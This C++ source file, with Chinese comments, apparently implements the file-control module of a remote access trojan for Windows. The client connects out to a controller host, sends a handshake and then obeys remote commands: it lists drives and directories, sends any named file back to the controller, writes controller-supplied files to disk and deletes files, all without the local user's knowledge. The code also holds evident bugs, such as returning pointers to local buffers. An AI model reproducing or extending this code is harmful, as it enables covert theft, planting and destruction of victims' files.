#include "File.h"
#include <ctime>

void FileConTrol::run()
{
//	run();
}

 FileConTrol::FileConTrol(char *host,int port)
{

	int ret = socket.connectToHost(host, port);
	if (ret == 0)
	{
	//	break;
	}
	Sleep(2000);
	char Head[10] = "FILE&";
	socket.write(Head);

	char name[1024] = "OPEN_FILE";

	char buf[1024] = { 0 };
	string two = socket.read(buf);

	if (name != two)		//返回是否为OPEN_FILE
	{
		return;
	}

	/***************第一次执行***************/

	char FristTemp[2046] = { 0 };
	
	char *FristSend = getAllDriver();
	strncat(FristTemp, FristSend, strlen(FristSend));
	socket.write(FristTemp);


	/***************第一次执行***************/

	while (1)
	{
		if (socket.isConnected == false)
		{
			cout << "\n FILE is false";
			break;
		}
		vector<string> list;

		char buff[1024] = { 0 };
		string buffer = socket.read(buff);	//读取命令

/*************************分割命令*************************/
//*
//*
		const char* cc = buffer.data();
		char* dd = const_cast<char*>(cc);

		char *tok = strtok(dd, "#");		
		while (tok)
		{
			list.push_back(tok);
			tok = strtok(NULL, "#");
		}

		int ListSize = list.size();
	//	cout << "list size:" << ListSize;
		if (list.size() == 0)
		{
			return;
		}

//*
//*
/*************************分割命令*************************/

		string head = list.at(0);
		if (head == "SEND_FILELIST_FRIST")		//获取驱动器
		{
			char FristTemp[2046] = { 0 };
			ZeroMemory(FristTemp, 2046);
			char *FristSend = getAllDriver();
			strncat(FristTemp, FristSend, 2046);
			socket.write(FristTemp);
		}


		if (head == "SEND_FILELIST")		//获取当前目录文件和文件夹
		{
			string one = list.at(1);
			one = one + "*.*";
			char* strListFile = listFiles(one.data());

			char send[4096*10] = { 0 };
			strncat(send, "SEND_FILELIST#", 15);
			strncat(send, strListFile, 4096*10);
			strncat(send, "&", 5);
			this->socket.write(send);
		}
		
		if (head == "SEND_FILE")		//Client File -> Server 
		{
			string fileName = list.at(1);
			CurrentStatus = true;

			int sendSize = getFileSize(fileName);	//获取文件大小
			
			char fileSizeTemp[100] = { 0 };				
			itoa(sendSize, fileSizeTemp, 10);	//int to ascill

			char sendFileBuf[1024] = { 0 };				//传递文件信息
			ZeroMemory(sendFileBuf, 1024);
			strncat(sendFileBuf, "SEND_FILE#",10);
			strncat(sendFileBuf, fileSizeTemp,strlen(fileSizeTemp));
			strncat(sendFileBuf, "&",1);

			socket.write(sendFileBuf);
			Sleep(3000);
			/*********读取文件操作*****/
			char *buffer = new char[sendSize];
			HANDLE pfile;
			pfile = ::CreateFile(fileName.data(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (pfile == INVALID_HANDLE_VALUE)
			{
				cout << "打开文件失败" << endl;;
				CloseHandle(pfile); // 一定注意在函数退出之前对句柄进行释放
				return;
			}
			DWORD readsize;
			ReadFile(pfile, buffer, sendSize, &readsize, NULL);
		//	buffer[filesize] = 0;
			socket.write(buffer, sendSize);
			CloseHandle(pfile);
			/*********读取文件操作*****/

			CurrentStatus = false;
		}

		if (head == "UPLOAD_FILE")			//	Server File -> Client 
		{
			string fileName = list.at(1);
			string fileSize = list.at(2);
			int size = atoi(fileSize.data());

			HANDLE pfile;
			pfile = ::CreateFile(fileName.data(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (pfile == INVALID_HANDLE_VALUE)
			{
				cout << "打开文件失败" << endl;;
				CloseHandle(pfile); // 一定注意在函数退出之前对句柄进行释放
				return;
			}
			DWORD rreadsize =0;
			char *buff = new char[size];
			int overRead =0; 
			int readsize =0;

			while (1)
			{
				int sum = size - overRead;
				overRead += socket.read(buff, sum);
				rreadsize += sizeof(buff);
				if (overRead == size)
				{
					break;
				}
			}

			DWORD overWrite;
			WriteFile(pfile, buff, size, &overWrite,NULL);
			CloseHandle(pfile);
			delete[] buff;
		}

		if (head == "DELETE_FILE")
		{
			string fileName = list.at(1);
			DeleteFile(fileName.data());
		}
		if (head == "")
		{
			return;
		}
	}
}


FileConTrol::~FileConTrol()
{
}

char* FileConTrol::getAllDriver()
{
	char rootPath[20] = { 0 }, driveType[50] = { 0 };
	UINT nType;
	char driver[4096] = { 0 };
	strncat(driver,"SEND_FILELIST_FRIST", 20);
	strncat(driver, "#", 1);
	for (char a = 'A'; a <= 'Z'; a++)
	{
		
		sprintf(rootPath, "%c:/", a);
		nType = GetDriveType(rootPath);
		if (nType != DRIVE_NO_ROOT_DIR)                  // DRIVE_NO_ROOT_DIR: 路径无效  
		{
			switch (nType)
			{
			case DRIVE_FIXED:
				strcpy(driveType, "硬盘");
				break;
			case DRIVE_REMOVABLE:
				strcpy(driveType, "移动硬盘");
				break;
			case DRIVE_CDROM:
				strcpy(driveType, "光盘");
				break;
			case DRIVE_RAMDISK:
				strcpy(driveType, "RAM盘");
				break;
			case DRIVE_REMOTE:
				strcpy(driveType, "Remote(Network) drive");
				break;
			case DRIVE_UNKNOWN:
			default:
				strcpy(driveType, "未知盘");
				break;
			}
			cout << rootPath << "\t" << driveType << endl;

			strncat(driver, rootPath, 20);
			strncat(driver, "#", 1);
		//	driver += "#";
		}
	}
	strncat(driver, "&", 1);
	return driver;
}

int FileConTrol::getFileSize(string name)
{
	FILE *fp = fopen(name.c_str(), "r");
	if (!fp) return -1;
	fseek(fp, 0L, SEEK_END);
	int size = ftell(fp);
	fclose(fp);

	return size;
}

char* FileConTrol::listFiles(const char * dir)
{
	string split = "|";
	string splitProOne = "dir";
	string splitProTwo = "file";

	string Tempname;
	string Temppro;
	string Tempsize;

	struct listFileName *strFile = new listFileName;


	char NameBuf[4096] = { 0 };
	char SizeBuf[4096] = { 0 };
	char ProBuf[4096] = { 0 };

	using namespace std;
	HANDLE hFind;
	WIN32_FIND_DATA findData;
	LARGE_INTEGER size;
	hFind = FindFirstFile(dir, &findData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		cout << "Failed to find first file!\n";
	//	return 1;
	}
	do
	{
		// 忽略"."和".."两个结果 
		if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
			continue;
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)    // 是否是目录 
		{
			strncat(ProBuf, "dir|",4);
			cout << findData.cFileName << "\t<dir>\n";
		}
		else
		{
			strncat(ProBuf, "file|", 5);
			size.LowPart = findData.nFileSizeLow;
			size.HighPart = findData.nFileSizeHigh;
			cout << findData.cFileName << "\t" << size.QuadPart << " bytes\n";
		}
		char sizeBUf[1000] = { 0 };
		itoa(size.QuadPart, sizeBUf, 10);
		strncat(SizeBuf, sizeBUf, 15);
		strncat(SizeBuf, "|", 1);
		
		char checkbuf[1024*2] = { 0 };
		memset(checkbuf, 0, 1024 * 2);
		strncat(checkbuf, findData.cFileName, sizeof(findData.cFileName));
		char *ret = result(checkbuf);

		strncat(NameBuf, ret, sizeof(findData.cFileName));
		strncat(NameBuf, "|", 1);
		
	//	Tempsize = Tempsize + sizeBUf + split;
	//	Tempname = Tempname + findData.cFileName+";" + split;
	} while (FindNextFile(hFind, &findData));
	cout << "Done!\n";

		char endBuf[4086 * 10] = { 0 };
		strncat(endBuf, NameBuf, 4096);
		strncat(endBuf, ";", 2);
		strncat(endBuf, SizeBuf, 4096);
		strncat(endBuf, ";", 2);
		strncat(endBuf, ProBuf, 4096);
		return endBuf;
}

char *FileConTrol::join1(char *a, char *b) 
{
	char *c = (char *)malloc(strlen(a) + strlen(b) + 1); //局部变量，用malloc申请内存
	if (c == NULL) exit(1);
	char *tempc = c; //把首地址存下来
	while (*a != '\0') {
		*c++ = *a++;
	}
	while ((*c++ = *b++) != '\0') {
		;
	}
	//注意，此时指针c已经指向拼接之后的字符串的结尾'\0' !
	return tempc;//返回值是局部malloc申请的指针变量，需在函数调用结束后free之
}

char * FileConTrol::result(char * lvBuf)
{
	int size = sizeof(lvBuf);

	for (int i = 0; i <= size; i++)
	{
		if (lvBuf[i] == '&')
		{
			lvBuf[i] = '@';
		}
	}
	return lvBuf;
}
